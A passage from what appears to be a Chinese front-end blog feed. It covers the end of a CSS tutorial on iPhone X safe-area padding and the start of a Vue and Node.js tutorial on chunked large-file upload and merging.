<span class="built_in">constant</span>(safe-area-inset-bottom); <span class="comment">/* iOS 11.0 */</span></span><br><span class="line">  <span class="attribute">padding-bottom</span>: <span class="built_in">env</span>(safe-area-inset-bottom); <span class="comment">/* iOS 11.2 */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a name="lVFnh"></a></p><h3 id="实践"><a href="#实践" class="headerlink" title="实践"></a>实践</h3><p><a name="ei1Oe"></a></p><h4 id="1-设置网页在可视区域的布局方式"><a href="#1-设置网页在可视区域的布局方式" class="headerlink" title="1.设置网页在可视区域的布局方式"></a>1.设置网页在可视区域的布局方式</h4><p>新增 viweport-fit 属性，使得页面内容完全覆盖整个窗口：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta name=&quot;viewport&quot; <span class="attribute">content</span>=&quot;<span class="attribute">width</span>=device-<span class="attribute">width</span>, initial-scale=<span class="number">1.0</span>, viewport-fit=cover, minimum-scale=<span class="number">1</span>, maximum-scale=<span class="number">1.0</span>, user-scalable=<span class="number">0</span>&quot;&gt;</span><br></pre></td></tr></table></figure><p><a name="YdtfC"></a></p><h4 id="2-让主体内容控制在安全区域内"><a href="#2-让主体内容控制在安全区域内" class="headerlink" title="2.让主体内容控制在安全区域内"></a>2.让主体内容控制在安全区域内</h4><p>假设我们的底部按钮高度是50px：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">body</span> &#123;</span><br><span class="line">  <span class="attribute">padding-top</span>: <span class="built_in">env</span>(safe-area-inset-top);</span><br><span class="line">  <span class="attribute">padding-right</span>: <span class="built_in">env</span>(safe-area-inset-right);</span><br><span class="line">  <span class="attribute">padding-bottom</span>: <span class="number">50px</span>;  <span class="comment">/* 兼容不支持 env( ) 的设备  */</span></span><br><span class="line">  <span class="attribute">padding-bottom</span>: <span class="built_in">calc</span>(<span class="built_in">env</span>(safe-area-inset-bottom) + <span class="number">50px</span>); <span class="comment">/* 在 iphone x + 中本句才会生效 */</span></span><br><span class="line">  <span class="attribute">padding-left</span>: <span class="built_in">env</span>(safe-area-inset-left);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>有两个关键点：</p><ol><li>写在前面的 padding-bottom: 50px 为了兼容没有底部胡子的设备，让主体内容偏移出底部按钮的高度，避免按钮遮挡内容。</li><li><code>padding-bottom: calc(env(safe-area-inset-bottom) + 50px);</code> 计算 底部非安全区域距离 与 底部按钮高度 之和 来做为 <code>padding-bottom</code>值，如果设备支持 env，那么 calc 会计算出一个合法的值，本句的优先级则最高，会覆盖前面的 <code>padding-bottom: 50px</code>。否则 calc 会计算出一个不合法的值，则本句声明不会生效。这样在不支持 env 设备中也可以达到兼容的目的。</li></ol><p>目前到这，在横屏场景下左侧的内容就不会被刘海遮挡住了：<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/300943/1666081635706-86150bda-7c7b-445b-8d0e-c11ff52e1d77.png#averageHue=%238c9c83&clientId=u30bf360d-bf01-4&from=paste&id=uf3b439d5&originHeight=544&originWidth=960&originalType=url&ratio=1&rotation=0&showTitle=false&status=done&style=none&taskId=uf1e4d04d-c750-41c8-8b26-eda83b6e1c8&title=" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/300943/1666081635706-86150bda-7c7b-445b-8d0e-c11ff52e1d77.png#averageHue=%238c9c83&clientId=u30bf360d-bf01-4&from=paste&id=uf3b439d5&originHeight=544&originWidth=960&originalType=url&ratio=1&rotation=0&showTitle=false&status=done&style=none&taskId=uf1e4d04d-c750-41c8-8b26-eda83b6e1c8&title=" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"><br><a name="nvhAH"></a></p><h4 id="3-底部按钮的处理"><a href="#3-底部按钮的处理" class="headerlink" title="3.底部按钮的处理"></a>3.底部按钮的处理</h4><p>首先给底部按钮一个外层容器 .btn-container ，设置样式时其中有几点比较关键：</p><ol><li>设置<code>padding-bottom: env(safe-area-inset-bottom);</code>增加一个 padding 值，让底部向外扩展一个非安全区域的距离。</li><li>设置<code>background: #FFF</code> 让整个 <code>.btn-container</code>背景为白色（包括刚新增的 <code>padding-bottom</code> 的区域）这样就可以遮挡住了底部内容。</li><li>设置 <code>box-sizing: content-box;</code>，因为在通常情况下 css 在 reset 阶段一般都设置了<code>* &#123;box-sizing: border-box;&#125;</code>这样一来设置 padding 就不能向外扩展距离了，所以在这里我们要把他改回 <code>content-box</code>。</li></ol><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.btn-container</span> &#123;</span><br><span class="line">  <span class="attribute">box-sizing</span>: content-box;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">50px</span>;</span><br><span class="line">  <span class="attribute">line-height</span>: <span class="number">50px</span>;</span><br><span class="line">  <span class="attribute">color</span>: <span class="number">#fff</span>;</span><br><span class="line">  <span class="attribute">position</span>: fixed;</span><br><span class="line">  <span class="attribute">bottom</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">left</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">right</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">text-align</span>: center;</span><br><span class="line">  <span class="attribute">background</span>: <span class="number">#FFF</span>;</span><br><span class="line">  <span class="attribute">padding-bottom</span>: <span class="built_in">env</span>(safe-area-inset-bottom);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.btn</span> &#123;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">100%</span>;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">50px</span>;</span><br><span class="line">  <span class="attribute">line-height</span>: <span class="number">50px</span>;</span><br><span class="line">  <span class="attribute">background-color</span>: <span class="number">#00c340</span>;</span><br><span class="line">  <span class="attribute">border</span>: none;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最终效果如图所示<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/300943/1666081635866-dc17d470-498c-41cb-b62e-4095ded62ab9.png#averageHue=%2399a694&clientId=u30bf360d-bf01-4&from=paste&id=u918115cd&originHeight=960&originWidth=544&originalType=url&ratio=1&rotation=0&showTitle=false&status=done&style=none&taskId=u87459362-8a26-445e-b7fd-dc906a20d61&title=" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/300943/1666081635866-dc17d470-498c-41cb-b62e-4095ded62ab9.png#averageHue=%2399a694&clientId=u30bf360d-bf01-4&from=paste&id=u918115cd&originHeight=960&originWidth=544&originalType=url&ratio=1&rotation=0&showTitle=false&status=done&style=none&taskId=u87459362-8a26-445e-b7fd-dc906a20d61&title=" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p>在 safari 中，页面往上稍滑动一点，出现 safari 的操作栏后，底部按钮依然会紧贴着操作栏：<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/300943/1666081635821-83d98fec-a439-45dc-bace-df3849d54600.png#averageHue=%238c9484&clientId=u30bf360d-bf01-4&from=paste&id=u44f16efe&originHeight=799&originWidth=453&originalType=url&ratio=1&rotation=0&showTitle=false&status=done&style=none&taskId=u72633772-beb4-4a1b-8a0e-e8023da51b1&title=" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/300943/1666081635821-83d98fec-a439-45dc-bace-df3849d54600.png#averageHue=%238c9484&clientId=u30bf360d-bf01-4&from=paste&id=u44f16efe&originHeight=799&originWidth=453&originalType=url&ratio=1&rotation=0&showTitle=false&status=done&style=none&taskId=u72633772-beb4-4a1b-8a0e-e8023da51b1&title=" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><a name="AYsAZ"></a></p><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><p><a href="https://link.juejin.cn/?target=https://www.jianshu.com/p/a1e8c7cf8821">如何适配 iPhone X</a><br /><a href="https://link.juejin.cn/?target=https://www.w3.org/TR/css-round-display-1/%23viewport-fit-descriptor">CSS Round Display Level 1</a><br /><a href="https://link.juejin.cn/?target=https://developer.mozilla.org/zh-CN/docs/conflicting/Web/CSS/@viewport_a33ee59ffd8336ffb3336900dea02e9f">viewport-fit</a></p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> html </category>
          
      </categories>
      
      
        <tags>
            
            <tag> compatible </tag>
            
            <tag> html </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>大文件上传和断点续传</title>
      <link href="/2022/06/21/solution/da-wen-jian-shang-chuan-he-duan-dian-xu-chuan/"/>
      <url>/2022/06/21/solution/da-wen-jian-shang-chuan-he-duan-dian-xu-chuan/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><p><a name="WK3tc"></a></p><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这段时间面试官都挺忙的，频频出现在博客文章标题，虽然我不是特别想蹭热度，但是实在想不到好的标题了-。-，蹭蹭就蹭蹭 :)<br />事实上我在面试的时候确实被问到了这个问题，而且是一道在线 coding 的编程题，当时虽然思路正确，可惜最终也并不算完全答对<br />结束后花了一段时间整理了下思路，那么究竟该如何实现一个大文件上传，以及在上传中如何实现断点续传的功能呢？<br />本文将从零搭建前端和服务端，实现一个大文件上传和断点续传的 demo<br />前端：<code>vue</code> <code>element-ui</code><br />服务端：<code>nodejs</code><br /><code>文章有误解的地方，欢迎指出，将在第一时间改正，有更好的实现方式希望留下你的评论</code><br><a name="Jwoal"></a></p><h1 id="大文件上传"><a href="#大文件上传" class="headerlink" title="大文件上传"></a>大文件上传</h1><p><a name="XRJsf"></a></p><h2 id="整体思路"><a href="#整体思路" class="headerlink" title="整体思路"></a>整体思路</h2><p><a name="qPQ6M"></a></p><h3 id="前端"><a href="#前端" class="headerlink" title="前端"></a>前端</h3><p>前端大文件上传网上的大部分文章已经给出了解决方案，核心是<code>利用 Blob.prototype.slice</code> 方法，和数组的 slice 方法相似，调用的 slice 方法可以返回<code>原文件的某个切片</code><br />这样我们就可以根据预先设置好的切片最大数量将文件切分为一个个切片，然后借助 http 的可并发性，同时上传多个切片，这样从原本传一个大文件，变成了<code>同时</code>传多个小的文件切片，可以大大减少上传时间<br />另外由于是并发，传输到服务端的顺序可能会发生变化，所以我们还需要给每个切片记录顺序<br><a name="ZNFD9"></a></p><h3 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a>服务端</h3><p>服务端需要负责接受这些切片，并在接收到所有切片后<code>合并</code>切片<br />这里又引伸出两个问题</p><ol><li>何时合并切片，即切片什么时候传输完成</li><li>如何合并切片</li></ol><p>第一个问题需要前端进行配合，前端在每个切片中都携带切片最大数量的信息，当服务端接受到这个数量的切片时自动合并，也可以额外发一个请求主动通知服务端进行切片的合并<br />第二个问题，具体如何合并切片呢？这里可以使用 nodejs 的 读写流（readStream&#x2F;writeStream），将所有切片的流传输到最终文件的流里<br /><code>talk is cheap,show me the code</code>，接着我们用代码实现上面的思路<br><a name="ncRhr"></a></p><h2 id="前端部分"><a href="#前端部分" class="headerlink" title="前端部分"></a>前端部分</h2><p>前端使用 Vue 作为开发框架，对界面没有太大要求，原生也可以，考虑到美观使用 element-ui 作为 UI 框架<br><a name="Tk50G"></a></p><h3 id="上传控件"><a href="#上传控件" class="headerlink" title="上传控件"></a>上传控件</h3><p>首先创建选择文件的控件，监听 change 事件以及上传按钮</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    &lt;input type=&quot;file&quot; @change=&quot;handleFileChange&quot; /&gt;</span><br><span class="line">      &lt;el-button @click=&quot;handleUpload&quot;&gt;上传&lt;/el-button&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">  export default &#123;</span><br><span class="line">    data: () =&gt; (&#123;</span><br><span class="line">      container: &#123;</span><br><span class="line">        file: null</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;),</span><br><span class="line">    methods: &#123;</span><br><span class="line">      handleFileChange(e) &#123;</span><br><span class="line">        const [file] = e.target.files;</span><br><span class="line">        if (!file) return;</span><br><span class="line">        Object.assign(this.$data, this.$options.data());</span><br><span class="line">        this.container.file = file;</span><br><span class="line">      &#125;,</span><br><span class="line">      async handleUpload() &#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2020/webp/164572/1588598300740-6910ec20-d65c-43f8-8267-b7cd21ab7694.webp" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2020/webp/164572/1588598300740-6910ec20-d65c-43f8-8267-b7cd21ab7694.webp" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"><br><a name="Ks79D"></a></p><h3 id="请求逻辑"><a href="#请求逻辑" class="headerlink" title="请求逻辑"></a>请求逻辑</h3><p>考虑到通用性，这里没有用第三方的请求库，而是用原生 XMLHttpRequest 做一层简单的封装来发请求</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">request(&#123;</span><br><span class="line">  url,</span><br><span class="line">  method = &quot;post&quot;,</span><br><span class="line">  data,</span><br><span class="line">  headers = &#123;&#125;,</span><br><span class="line">  requestList</span><br><span class="line">&#125;) &#123;</span><br><span class="line">  return new Promise(resolve =&gt; &#123;</span><br><span class="line">    const xhr = new XMLHttpRequest();</span><br><span class="line">    xhr.open(method, url);</span><br><span class="line">    Object.keys(headers).forEach(key =&gt;</span><br><span class="line">      xhr.setRequestHeader(key, headers[key])</span><br><span class="line">                                );</span><br><span class="line">    xhr.send(data);</span><br><span class="line">    xhr.onload = e =&gt; &#123;</span><br><span class="line">      resolve(&#123;</span><br><span class="line">        data: e.target.response</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a name="sH0vD"></a></p><h3 id="上传切片"><a href="#上传切片" class="headerlink" title="上传切片"></a>上传切片</h3><p>接着实现比较重要的上传功能，上传需要做两件事</p><ul><li>对文件进行切片</li><li>将切片传输给服务端</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    &lt;input type=&quot;file&quot; @change=&quot;handleFileChange&quot; /&gt;</span><br><span class="line">      &lt;el-button @click=&quot;handleUpload&quot;&gt;上传&lt;/el-button&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">  + const SIZE = 10 * 1024 * 1024; // 切片大小</span><br><span class="line">  export default &#123;</span><br><span class="line">    data: () =&gt; (&#123;</span><br><span class="line">      container: &#123;</span><br><span class="line">        file: null</span><br><span class="line">      &#125;，</span><br><span class="line">           data: []</span><br><span class="line">    &#125;),</span><br><span class="line">    methods: &#123;</span><br><span class="line">      request() &#123;&#125;,</span><br><span class="line">      handleFileChange() &#123;&#125;,</span><br><span class="line">          // 生成文件切片</span><br><span class="line">          createFileChunk(file, size = SIZE) &#123;</span><br><span class="line">           const fileChunkList = [];</span><br><span class="line">        let cur = 0;</span><br><span class="line">        while (cur &lt; file.size) &#123;</span><br><span class="line">            fileChunkList.push(&#123; file: file.slice(cur, cur + size) &#125;);</span><br><span class="line">            cur += size;</span><br><span class="line">          &#125;</span><br><span class="line">        return fileChunkList;</span><br><span class="line">      &#125;,</span><br><span class="line">       // 上传切片</span><br><span class="line">        async uploadChunks() &#123;</span><br><span class="line">          const requestList = this.data</span><br><span class="line">             .map((&#123; chunk，hash &#125;) =&gt; &#123;</span><br><span class="line">                  const formData = new FormData();</span><br><span class="line">                  formData.append(&quot;chunk&quot;, chunk);</span><br><span class="line">                  formData.append(&quot;hash&quot;, hash);</span><br><span class="line">                  formData.append(&quot;filename&quot;, this.container.file.name);</span><br><span class="line">                  return &#123; formData &#125;;</span><br><span class="line">                &#125;)</span><br><span class="line">              .map(async (&#123; formData &#125;) =&gt;</span><br><span class="line">                  this.request(&#123;</span><br><span class="line">                      url: &quot;http://localhost:3000&quot;,</span><br><span class="line">                      data: formData</span><br><span class="line">                      &#125;)</span><br><span class="line">                );</span><br><span class="line">          await Promise.all(requestList); // 并发切片</span><br><span class="line">        &#125;,</span><br><span class="line">          async handleUpload() &#123;</span><br><span class="line">            if (!this.container.file) return;</span><br><span class="line">            const fileChunkList = this.createFileChunk(this.container.file);</span><br><span class="line">            this.data = fileChunkList.map((&#123; file &#125;，index) =&gt; (&#123;</span><br><span class="line">                chunk: file,</span><br><span class="line">                hash: this.container.file.name + &quot;-&quot; + index // 文件名 + 数组下标</span><br><span class="line">                &#125;));</span><br><span class="line">            await this.uploadChunks();</span><br><span class="line">          &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>当点击上传按钮时，调用 <code>createFileChunk</code> 将文件切片，切片数量通过文件大小控制，这里设置 10MB，也就是说 100 MB 的文件会被分成 10 个切片<br />createFileChunk 内使用 while 循环和 slice 方法将切片放入 <code>fileChunkList</code> 数组中返回<br />在生成文件切片时，需要给每个切片一个标识作为 hash，这里暂时使用<code>文件名 + 下标</code>，这样后端可以知道当前切片是第几个切片，用于之后的合并切片<br />随后调用 <code>uploadChunks</code> 上传所有的文件切片，将文件切片，切片 hash，以及文件名放入 FormData 中，再调用上一步的 <code>request</code> 函数返回一个 proimise，最后调用 Promise.all 并发上传所有的切片<br><a name="KHpY4"></a></p><h3 id="发送合并请求"><a href="#发送合并请求" class="headerlink" title="发送合并请求"></a>发送合并请求</h3><p>这里使用整体思路中提到的第二种合并切片的方式，即前端主动通知服务端进行合并，所以前端还需要额外发请求，服务端接受到这个请求时主动合并切片</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    &lt;input type=&quot;file&quot; @change=&quot;handleFileChange&quot; /&gt;</span><br><span class="line">      &lt;el-button @click=&quot;handleUpload&quot;&gt;上传&lt;/el-button&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">  export default &#123;</span><br><span class="line">    data: () =&gt; (&#123;</span><br><span class="line">      container: &#123;</span><br><span class="line">        file: null</span><br><span class="line">      &#125;,</span><br><span class="line">      data: []</span><br><span class="line">    &#125;),</span><br><span class="line">    methods: &#123;</span><br><span class="line">      request() &#123;&#125;,</span><br><span class="line">      handleFileChange() &#123;&#125;,</span><br><span class="line">      createFileChunk() &#123;&#125;,</span><br><span class="line">      // 上传切片，同时过滤已上传的切片</span><br><span class="line">      async uploadChunks() &#123;</span><br><span class="line">        const requestList = this.data</span><br><span class="line">          .map((&#123; chunk，hash &#125;) =&gt; &#123;</span><br><span class="line">            const formData = new FormData();</span><br><span class="line">            formData.append(&quot;chunk&quot;, chunk);</span><br><span class="line">            formData.append(&quot;hash&quot;, hash);</span><br><span class="line">            formData.append(&quot;filename&quot;, this.container.file.name);</span><br><span class="line">            return &#123; formData &#125;;</span><br><span class="line">          &#125;)</span><br><span class="line">          .map(async (&#123; formData &#125;) =&gt;</span><br><span class="line">            this.request(&#123;</span><br><span class="line">              url: &quot;http://localhost:3000&quot;,</span><br><span class="line">              data: formData</span><br><span class="line">            &#125;)</span><br><span class="line">              );</span><br><span class="line">        await Promise.all(requestList);</span><br><span class="line">              // 合并切片</span><br><span class="line">        await this.mergeRequest();</span><br><span class="line">      &#125;,</span><br><span class="line">        async mergeRequest() &#123;</span><br><span class="line">            await this.request(&#123;</span><br><span class="line">                url: &quot;http://localhost:3000/merge&quot;,</span><br><span class="line">                 headers: &#123;</span><br><span class="line">                      &quot;content-type&quot;: &quot;application/json&quot;</span><br><span class="line">                    &#125;,</span><br><span class="line">                                       data: JSON.stringify(&#123;</span><br><span class="line">                                              filename: this.container.file.name</span><br><span class="line">                                              &#125;)</span><br><span class="line">                                        &#125;);</span><br><span class="line">            &#125;,    </span><br><span class="line">      async handleUpload() &#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><a name="W8bY3"></a></p><h2 id="服务端部分"><a href="#服务端部分" class="headerlink" title="服务端部分"></a>服务端部分</h2><p>简单使用 http 模块搭建服务端</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">const http = require(&quot;http&quot;);</span><br><span class="line">  const server = http.createServer();</span><br><span class="line">  server.on(&quot;request&quot;, async (req, res) =&gt; &#123;</span><br><span class="line">  res.setHeader(&quot;Access-Control-Allow-Origin&quot;, &quot;*&quot;);</span><br><span class="line">  res.setHeader(&quot;Access-Control-Allow-Headers&quot;, &quot;*&quot;);</span><br><span class="line">  if (req.method === &quot;OPTIONS&quot;) &#123;</span><br><span class="line">  res.status = 200;</span><br><span class="line">  res.end();</span><br><span class="line">  return;</span><br><span class="line">  &#125;</span><br><span class="line">  &#125;);</span><br><span class="line">  server.listen(3000, () =&gt; console.log(&quot;正在监听 3000 端口&quot;));</span><br></pre></td></tr></table></figure><p><a name="NckM5"></a></p><h3 id="接受切片"><a href="#接受切片" class="headerlink" title="接受切片"></a>接受切片</h3><p>使用 <code>multiparty</code> 包处理前端传来的 FormData<br />在 multiparty.parse 的回调中，files 参数保存了 FormData 中文件，fields 参数保存了 FormData 中非文件的字段</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">const http = require(&quot;http&quot;);</span><br><span class="line">  const path = require(&quot;path&quot;);</span><br><span class="line">  const fse = require(&quot;fs-extra&quot;);</span><br><span class="line">  const multiparty = require(&quot;multiparty&quot;);</span><br><span class="line">  const server = http.createServer();</span><br><span class="line">  + const UPLOAD_DIR = path.resolve(__dirname, &quot;..&quot;, &quot;target&quot;); // 大文件存储目录</span><br><span class="line">  server.on(&quot;request&quot;, async (req, res) =&gt; &#123;</span><br><span class="line">  res.setHeader(&quot;Access-Control-Allow-Origin&quot;, &quot;*&quot;);</span><br><span class="line">  res.setHeader(&quot;Access-Control-Allow-Headers&quot;, &quot;*&quot;);</span><br><span class="line">  if (req.method === &quot;OPTIONS&quot;) &#123;</span><br><span class="line">  res.status = 200;</span><br><span class="line">  res.end();</span><br><span class="line">  return;</span><br><span class="line">  &#125;</span><br><span class="line">  +  const multipart = new multiparty.Form();</span><br><span class="line">  +  multipart.parse(req, async (err, fields, files) =&gt; &#123;</span><br><span class="line">  +    if (err) &#123;</span><br><span class="line">  +      return;</span><br><span class="line">  +    &#125;</span><br><span class="line">  +    const [chunk] = files.chunk;</span><br><span class="line">  +    const [hash] = fields.hash;</span><br><span class="line">  +    const [filename] = fields.filename;</span><br><span class="line">  +    const chunkDir = path.resolve(UPLOAD_DIR, filename);</span><br><span class="line">  +   // 切片目录不存在，创建切片目录</span><br><span class="line">  +    if (!fse.existsSync(chunkDir)) &#123;</span><br><span class="line">  +      await fse.mkdirs(chunkDir);</span><br><span class="line">  +    &#125;</span><br><span class="line">  +      // fs-extra 专用方法，类似 fs.rename 并且跨平台</span><br><span class="line">  +      // fs-extra 的 rename 方法 windows 平台会有权限问题</span><br><span class="line">  +      // https://github.com/meteor/meteor/issues/7852#issuecomment-255767835</span><br><span class="line">  +      await fse.move(chunk.path, `$&#123;chunkDir&#125;/$&#123;hash&#125;`);</span><br><span class="line">  +    res.end(&quot;received file chunk&quot;);</span><br><span class="line">  +  &#125;);</span><br><span class="line">  &#125;);</span><br><span class="line">  server.listen(3000, () =&gt; console.log(&quot;正在监听 3000 端口&quot;));</span><br><span class="line">  复制代码</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2020/webp/164572/1588598300724-04872720-0840-4492-b665-47ac9f945492.webp" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2020/webp/164572/1588598300724-04872720-0840-4492-b665-47ac9f945492.webp" 